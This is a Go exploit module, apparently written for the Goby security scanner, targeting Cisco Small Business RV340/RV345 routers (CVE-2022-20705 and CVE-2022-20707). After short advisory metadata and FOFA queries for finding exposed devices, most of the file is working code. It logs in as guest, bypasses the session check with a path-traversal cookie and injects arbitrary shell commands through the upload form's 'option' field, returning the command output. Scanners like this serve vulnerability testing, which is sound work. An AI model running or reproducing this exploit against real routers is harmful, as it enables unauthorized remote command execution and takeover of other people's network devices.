package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cisco Small Business RV Series Routers Multiple upload Api Command Execution Vulnerabilities (CVE-2022-20705  CVE-2022-20707)",
    "Description": "<p>The Cisco Small Business RV series routers are routers developed by Cisco in the United States.</p><p>An arbitrary command execution vulnerability exists in the Cisco Small Business RV series routers. An attacker can first exploit CVE-2022-20705 for session bypass and then exploit CVE-2022-20707 to execute arbitrary code on the affected device.</p>",
    "Impact": "<p>Cisco Small Business RV Series Routers Multiple Command Execution Vulnerabilities (CVE-2022-20705  CVE-2022-20707)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-smb-mult-vuln-KA9PK6D\">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-smb-mult-vuln-KA9PK6D</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Cisco Small Business RV Series Routers",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Cisco Small Business RV 系列路由器 upload 接口任意命令执行漏洞 （CVE-2022-20705 && CVE-2022-20707）",
            "Product": "Cisco Small Business RV 系列路由器",
            "Description": "<p>Cisco Small Business RV 系列路由器是美国 Cisco 公司开发的路由器。</p><p>Cisco Small Business RV 系列路由器存在任意命令执行漏洞。攻击者可以先利用 CVE-2022-20705 进行 session 绕过，随后利用 CVE-2022-20707 在受影响的设备上执行任意代码。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-smb-mult-vuln-KA9PK6D\">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-smb-mult-vuln-KA9PK6D</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Cisco Small Business RV160, RV260, RV340, and RV345 等系列路由器存在任意命令执行漏洞。攻击者可以先利用 CVE-2022-20705 进行 session 绕过，随后利用 CVE-2022-20707 在受影响的设备上执行任意代码。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Cisco Small Business RV Series Routers Multiple upload Api Command Execution Vulnerabilities (CVE-2022-20705  CVE-2022-20707)",
            "Product": "Cisco Small Business RV Series Routers",
            "Description": "<p>The Cisco Small Business RV series routers are routers developed by Cisco in the United States.</p><p>An arbitrary command execution vulnerability exists in the Cisco Small Business RV series routers. An attacker can first exploit CVE-2022-20705 for session bypass and then exploit CVE-2022-20707 to execute arbitrary code on the affected device.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-smb-mult-vuln-KA9PK6D\">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-smb-mult-vuln-KA9PK6D</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Cisco Small Business RV Series Routers Multiple Command Execution Vulnerabilities (CVE-2022-20705  CVE-2022-20707)</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"Cisco RV340\"  || title=\"Cisco RV345P\" || title=\"Cisco RV345\"",
    "GobyQuery": "title=\"Cisco RV340\"  || title=\"Cisco RV345P\" || title=\"Cisco RV345\"",
    "Author": "Chin_z",
    "Homepage": "http://www.houtian-hb.com",
    "DisclosureDate": "2021-12-01",
    "References": [
        "https://blog.relyze.com/2022/04/pwning-cisco-rv340-with-4-bug-chain.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2022-20705"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202202-166"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10264"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/jsonrpc"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.FollowRedirect = false
			cfg.VerifyTls = false
			cfg.Data = "{\"jsonrpc\":\"2.0\",\"method\":\"login\",\"params\":{\"user\":\"guest\",\"pass\":\"Z3Vlc3Q=\",\"lang\":\"English\"}}"
			httpclient.DoHttpRequest(u, cfg)
			uri3 := "/upload"
			cfg = httpclient.NewPostRequestConfig(uri3)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryTOhixyxIco1Wx8YP")
			cfg.Header.Store("Cookie", "sessionid=../../../etc/firmware_version;sessionid=a1d5fd7a0a0583dac7a75bc")
			cmd := "echo 202cb962ac5${IFS}7152d234b70"
			cfg.Data = fmt.Sprintf(
				`------WebKitFormBoundaryTOhixyxIco1Wx8YP
Content-Disposition: form-data; name="sessionid"
a1d5fd7a0a0583dac7a75bc
------WebKitFormBoundaryTOhixyxIco1Wx8YP
Content-Disposition: form-data; name="pathparam"
Signature
------WebKitFormBoundaryTOhixyxIco1Wx8YP
Content-Disposition: form-data; name="fileparam"
file005
------WebKitFormBoundaryTOhixyxIco1Wx8YP
Content-Disposition: form-data; name="destination"
123
------WebKitFormBoundaryTOhixyxIco1Wx8YP
Content-Disposition: form-data; name="option"
';%s #
------WebKitFormBoundaryTOhixyxIco1Wx8YP
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain
test
------WebKitFormBoundaryTOhixyxIco1Wx8YP--`, cmd)
			cfg.Data = strings.ReplaceAll(cfg.Data, "\r\n", "\n")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if strings.Contains(resp.RawBody, "202cb962ac5 7152d234b70") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/jsonrpc"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.FollowRedirect = false
			cfg.VerifyTls = false
			cfg.Data = "{\"jsonrpc\":\"2.0\",\"method\":\"login\",\"params\":{\"user\":\"guest\",\"pass\":\"Z3Vlc3Q=\",\"lang\":\"English\"}}"
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			uri3 := "/upload"
			cfg = httpclient.NewPostRequestConfig(uri3)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryTOhixyxIco1Wx8YP")
			cfg.Header.Store("Cookie", "sessionid=../../../etc/firmware_version;sessionid=a1d5fd7a0a0583dac7a75bc")
			cfg.Data = fmt.Sprintf(
				`------WebKitFormBoundaryTOhixyxIco1Wx8YP
Content-Disposition: form-data; name="sessionid"
a1d5fd7a0a0583dac7a75bc
------WebKitFormBoundaryTOhixyxIco1Wx8YP
Content-Disposition: form-data; name="pathparam"
Signature
------WebKitFormBoundaryTOhixyxIco1Wx8YP
Content-Disposition: form-data; name="fileparam"
file005
------WebKitFormBoundaryTOhixyxIco1Wx8YP
Content-Disposition: form-data; name="destination"
123
------WebKitFormBoundaryTOhixyxIco1Wx8YP
Content-Disposition: form-data; name="option"
';echo 202cb962ac5 && %s && echo 7152d234b70 #
------WebKitFormBoundaryTOhixyxIco1Wx8YP
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain
test
------WebKitFormBoundaryTOhixyxIco1Wx8YP--`, cmd)
			cfg.Data = strings.ReplaceAll(cfg.Data, "\r\n", "\n")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				reg := regexp.MustCompile(`(?s)202cb962ac5(.*?)7152d234b70`)
				result := reg.FindStringSubmatch(resp.Utf8Html)
				if len(result) > 0 {
					expResult.Output = result[1]
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
